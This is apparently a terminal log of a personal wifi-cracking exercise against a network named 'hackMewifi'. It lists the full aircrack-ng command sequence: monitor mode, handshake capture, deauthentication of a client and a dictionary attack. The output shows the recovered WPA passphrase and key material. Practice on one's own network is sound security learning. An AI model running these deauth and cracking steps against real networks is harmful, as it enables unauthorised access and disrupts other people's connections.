# History 

```
~/D/t/wifi_crack » history -15                                                                                                           02:29:29
ENDING WIFI CRACK EXERCISE
++++++++++++++++++++++++++
++++++++++++++++++++++++++
sudo systemctl restart NetworkManager
aircrack-ng hackMewifi-01.cap -w dates_1920_2024_wordlist.txt
sudo aireplay-ng --deauth 5 -a A8:F7:E0:06:1E:4E -c B2:4B:41:C2:D1:19  wlan0mon
sudo airodump-ng --channel 3 --bssid A8:F7:E0:06:1E:4E --write hackMewifi  wlan0mon
sudo airodump-ng wlan0mon
iwconfig wlan0mon
sudo airmon-ng start wlx00117f1bf909
sudo airmon-ng check kill
sudo airmon-ng check
iwconfig
++++++++++++++++++++++++++++
++++++++++++++++++++++++++++
STARTING WIFI CRACK EXERCISE
```



# Commands

```
~/D/t/wifi_crack » iwconfig                                                                                                                                                                                   02:05:01
...
wlx00117f1bf909  IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
---------------

~/D/t/wifi_crack » aircrack-ng hackMewifi-01.cap -w dates_1920_2024_wordlist.txt

                               Aircrack-ng 1.7 

      [00:00:05] 61034/61584 keys tested (12051.64 k/s) 

      Time left: 0 seconds                                      99.11%

                           KEY FOUND! [ 09302008 ]


      Master Key     : 1E 69 BF 98 1D AB AE 01 42 A7 41 1D 48 51 DA C2 
                       3D 61 A6 EF D3 D9 E8 BE 1B 6A D6 8B 25 A0 EC 97 

      Transient Key  : 9B B3 38 09 42 C7 EA EB 66 15 43 7A BD D6 DC 8C 
                       72 C9 DA 65 42 18 0B 68 11 C4 94 72 6D E1 28 F4 
                       FC F8 77 25 FE CE 99 05 A1 24 0A 3E 1A 25 DA A0 
                       91 EA 5A 11 CC 40 D7 32 9D 86 24 68 14 22 04 25 

      EAPOL HMAC     : 4E 4F 81 4E 9F 71 58 D7 54 1B B0 F1 02 9F 07 DD 


